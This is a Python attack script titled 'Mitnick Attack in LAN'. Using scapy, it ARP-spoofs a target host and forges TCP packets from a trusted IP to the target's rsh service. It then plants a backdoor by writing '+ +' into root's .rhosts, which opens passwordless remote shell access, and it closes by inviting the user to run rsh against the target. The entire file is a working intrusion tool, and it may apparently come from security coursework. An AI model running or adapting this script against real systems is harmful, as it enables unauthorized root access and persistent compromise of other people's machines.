"""Mitnick Attack in LAN."""
import argparse
import logging
import multiprocessing
import os
import sys
import time

import scapy.all as sc
from scapy.layers import inet, l2

RSH_PORT = 514
FIRST_SRC_PORT = 1023
SECOND_SRC_PORT = 2046

logger = logging.getLogger(__name__)


def get_mac_from_ip(interface: str, ip: str) -> str:
    """Get the MAC address of the machine with the specified 'ip'."""
    # Ping machine
    ping_res = os.system(f'ping -c 1 {ip} > /dev/null 2>&1')

    if ping_res != 0:
        return ''

    # Get machine's IP using the ARP table
    with os.popen(f'arp -n | grep {interface} | grep {ip} | tr -s " "'
                  ' | cut -d " "'
                  ' -f 3') as f:
        mac_addr = f.read().strip()

    return mac_addr


def get_ifname_and_mac_by_iprange(target_ip: str) -> tuple:
    """Get the MAC address from the interface matching the target IP."""
    ip_prefix = '.'.join(target_ip.split('.')[:2])

    with os.popen(f'ip r | grep "{ip_prefix}" | cut -d " " -f 3') as f:
        ifname = f.read().strip()

    if not ifname:
        return ()

    with os.popen(f'ip a show {ifname} | grep "link/ether" | tr -s " " |'
                  'cut -d " " -f 3') as f:
        mac_addr = f.read().strip()

    if not mac_addr:
        return ()

    return ifname, mac_addr


def arpspoof(mac_addr: str, target_ip: str, target_mac: str,
             trusted_ip: str) -> None:
    """Run the ARP Spoofing."""
    a = l2.ARP()
    a.op = 'is-at'

    # Target
    a.pdst = target_ip
    a.hwdst = target_mac

    # Trusted IP
    a.psrc = trusted_ip

    # Own MAC address
    a.hwsrc = mac_addr

    # Waits for its parent send SIGTERM
    while True:
        sc.send(a, verbose=0)
        time.sleep(1)


def rsh_attack(target_ip: str, trusted_ip: str, ifname: str) -> None:
    """Run the Remote Shell attack."""
    # Base IP packet with spoofed source IP
    ip_packet = inet.IP(src=trusted_ip, dst=target_ip)

    # --- THREE-WAY HANDSHAKE
    seq = 1000
    logger.info('Initiating TCP three-way handshake...')
    syn_packet = inet.TCP(sport=FIRST_SRC_PORT,
                          dport=RSH_PORT,
                          flags='S',
                          seq=seq)
    synack = sc.sr1(ip_packet / syn_packet, verbose=0)

    seq += 1

    ack_packet = inet.TCP(sport=FIRST_SRC_PORT,
                          dport=RSH_PORT,
                          flags='A',
                          ack=synack.seq + 1,
                          seq=seq)
    sc.send(ip_packet / ack_packet, verbose=0)
    logger.info('Done')

    # --- RSH - Send backdoor
    logger.info('Sending backdoor...')
    backdoor = 'echo "+ +" > ~/.rhosts'
    data = f'{SECOND_SRC_PORT}\x00root\x00root\x00{backdoor}\x00'
    tcp_packet = inet.TCP(sport=FIRST_SRC_PORT,
                          dport=RSH_PORT,
                          flags='PA',
                          ack=synack.seq + 1,
                          seq=seq)
    res = sc.sr1(ip_packet / tcp_packet / data, verbose=0)
    logger.info('Done')

    # --- RSH - Second connection's three-way handshake
    logger.info('Accepting second three-way handshake')
    res = sc.sniff(iface=ifname, filter=f'tcp and host {target_ip}',
                   count=1)[0]

    synack = inet.TCP(sport=SECOND_SRC_PORT,
                      dport=1023,
                      flags='SA',
                      ack=res.seq + 1,
                      seq=1000)
    res = sc.sr1(ip_packet / synack, verbose=0)
    logger.info('Done')

    return


def main(target_ip: str, trusted_ip: str) -> None:
    """Run the Mitnick Attack."""
    format = '[%(levelname)s] %(message)s'
    logging.basicConfig(level=logging.INFO, format=format)

    logger.info(f'Target IP: {target_ip}')
    logger.info(f'Trusted IP: {trusted_ip}')

    res = get_ifname_and_mac_by_iprange(target_ip)

    if len(res) == 0:
        logger.info(
            'Error: could not get ifname & MAC address using the target IP')
        sys.exit(1)

    ifname, mac_addr = res

    logger.info(f'Interface identified: {ifname}')
    logger.info(f'MAC Address: {mac_addr}')

    target_mac = get_mac_from_ip(ifname, target_ip)

    if target_mac == '':
        logger.info('Error: could not get target MAC address')
        sys.exit(1)

    logger.info(f'Target MAC Address: {target_mac}')

    logger.info(f'Disabling IP forwarding on interface {ifname}')
    os.system(
        f'sysctl -w net.ipv4.conf.{ifname}.forwarding=0 > /dev/null 2>&1')

    logger.info('Calling ARP Spoof in another process...')
    arpspoof_proc = multiprocessing.Process(name='ArpSpoofThread',
                                            target=arpspoof,
                                            kwargs={
                                                'mac_addr': mac_addr,
                                                'target_ip': target_ip,
                                                'target_mac': target_mac,
                                                'trusted_ip': trusted_ip
                                            })
    arpspoof_proc.start()

    logger.info('Initiating attack...')
    rsh_attack(target_ip, trusted_ip, ifname)
    logger.info('Finished attack')

    logger.info(f'Enabling IP forwarding on interface {ifname}')
    os.system(
        f'sysctl -w net.ipv4.conf.{ifname}.forwarding=1 > /dev/null 2>&1')

    arpspoof_proc.terminate()
    logger.info('Killed ARP Spoof process')

    logger.info(f'Done! Now you can run "rsh {target_ip}" :)')

    return


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='ARP Spoofing')

    parser.add_argument('--target_ip',
                        type=str,
                        required=True,
                        help='Target IP')

    parser.add_argument('--trusted_ip',
                        type=str,
                        required=True,
                        help='Trusted IP')

    args = parser.parse_args()

    main(args.target_ip, args.trusted_ip)
